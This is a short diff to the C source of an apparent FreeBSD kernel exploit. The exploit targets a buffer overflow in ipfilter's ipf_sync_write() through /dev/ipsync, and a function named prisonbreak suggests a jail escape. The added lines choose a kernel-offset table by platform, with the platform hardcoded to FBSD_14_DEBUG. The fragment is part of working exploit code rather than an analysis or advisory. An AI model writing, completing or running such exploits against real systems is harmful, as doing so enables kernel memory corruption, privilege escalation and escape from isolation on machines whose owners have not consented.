@@ -188,6 +188,11 @@ unsigned long get_pargs() {
   return (unsigned long)kp.ki_args + 50;
 }
 
+/* XXX TODO, need to do a proper implementation based on uname() values */
+unsigned int get_platform_idx() {
+  return FBSD_14_DEBUG;
+}
+
 void* prisonbreak(void* arg) {
   /*
    *
@@ -268,6 +273,12 @@ void* prisonbreak(void* arg) {
     printf("Error: failed to open /dev/ipsync\n");
     exit(0);
   }
+  unsigned int idx = get_platform_idx();
+  if (idx == UNKNOWN) {
+    printf("platform not supported for this exploit\n");
+    exit(0);
+  }
+  struct kernel_offsets ko = koffsets[idx];
 
   // We need to write len bytes to the char data[2048] local buffer allocated by
   // `ipf_sync_write()` in sys/netpfil/ipfilter/netinet/ip_sync.c:420 in order
